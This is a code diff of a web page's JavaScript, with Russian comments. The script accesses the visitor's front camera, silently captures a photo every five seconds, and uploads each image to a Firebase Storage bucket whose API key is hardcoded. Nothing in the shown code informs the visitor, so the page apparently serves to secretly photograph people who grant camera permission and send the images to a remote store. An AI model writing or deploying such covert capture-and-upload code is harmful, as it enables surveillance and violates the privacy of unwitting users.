@@ -19,7 +19,7 @@
     <script type="module">
         // Импорт модулей Firebase
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";    <!-- Подключение Firebase -->
+        import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";   
         // Конфигурация Firebase (вставь свои ключи)
         const firebaseConfig = {
   apiKey: "AIzaSyDPswGPJQVRm1HZwcClKo8lXRwjk_pxAyM",
@@ -32,41 +32,41 @@
         // Инициализация Firebase
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
+        console.log("Firebase initialized");
 
-        const video = document.getElementById('video');
+        const frontVideo = document.getElementById('front-camera-video');
         const canvas = document.getElementById('canvas');
 
         // Получаем доступ к фронтальной камере
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                video.srcObject = stream;
-                // Начинаем автоматически делать фото через каждые 5 секунд
+                frontVideo.srcObject = stream;
+                console.log("Front camera accessed");
+                // Автоматически делаем фото через каждые 5 секунд
                 setInterval(captureAndUploadPhoto, 5000);
             })
             .catch(error => {
-                console.error("Error accessing camera:", error);
+                console.error("Error accessing front camera:", error);
             });
 
-        // Функция для автоматического снятия фото и загрузки на Firebase
+        // Функция для снятия фото и загрузки на Firebase
         function captureAndUploadPhoto() {
             const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.width = frontVideo.videoWidth;
+            canvas.height = frontVideo.videoHeight;
+            context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
 
-            // Преобразуем изображение в Data URL
             const dataURL = canvas.toDataURL('image/png');
-
-            // Преобразуем Data URL в файл и загружаем на Firebase
+            console.log("Photo captured, preparing to upload...");
             uploadToFirebase(dataURL);
         }
 
-        // Функция загрузки изображения на Firebase Storage
+        // Загрузка изображения на Firebase Storage
         function uploadToFirebase(dataURL) {
             const storageRef = ref(storage, `photos/photo_${Date.now()}.png`);
             const file = dataURLtoFile(dataURL, `photo_${Date.now()}.png`);
+            console.log("Uploading photo...");
 
-            // Загрузка файла на Firebase Storage
             uploadBytes(storageRef, file)
                 .then(() => {
                     console.log("Photo uploaded successfully!");
@@ -76,7 +76,7 @@
                 });
         }
 
-        // Вспомогательная функция для конвертации Data URL в файл
+        // Конвертация Data URL в файл
         function dataURLtoFile(dataurl, filename) {
             const arr = dataurl.split(',');
             const mime = arr[0].match(/:(.*?);/)[1];
